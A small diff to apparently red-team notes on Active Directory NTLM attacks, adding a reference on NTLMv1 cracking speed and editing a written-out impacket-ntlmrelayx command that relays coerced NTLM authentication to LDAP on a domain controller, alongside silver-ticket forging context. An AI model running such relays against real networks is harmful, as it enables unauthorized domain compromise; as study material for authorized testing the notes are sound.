@@ -76,6 +76,7 @@ In any case the resulting NT hash can be used to forge a RC4 [[notes/ad/silver-t
 
 References:
 
+- [twitter.com/_EthicalChaos_/status/1710185074061152501](https://twitter.com/_EthicalChaos_/status/1710185074061152501), cracking NTLMv1 hashes takes two days with four RTX 3080s
 - [NTLMv1 Multitool](https://github.com/evilmog/ntlmv1-multi)
 - [Cracking NETLM/NETNTLMv1 authentication](https://crack.sh/netntlm/)
 - [NetNTLMtoSilverTicket](https://github.com/notmedic/netntlmtosilverticket)
@@ -88,7 +89,7 @@ Additionally relay protections like SMB Signing and LDAP Singing don't apply to 
 [[notes/ad/ntlm-relay-from-smb|Coerce NTLM authentication over SMB]] from a valuable computer and [[notes/ad/ntlm-relay-to-ldap|relay to LDAP]] on a domain controller.
 
 ~~~ bash
-sudo impacket-ntlmrelayx --no-http-server --no-raw-server --no-wcf-server -smb2support --no-dump --no-da --no-acl --no-validate-privs --remove-mic -i -t ldap://dc01.corp.local
+impacket-ntlmrelayx --no-http-server --no-raw-server --no-wcf-server -smb2support --no-dump --no-da --no-acl --no-validate-privs --remove-mic -i -t ldap://dc01.corp.local
 ~~~
 
 References:
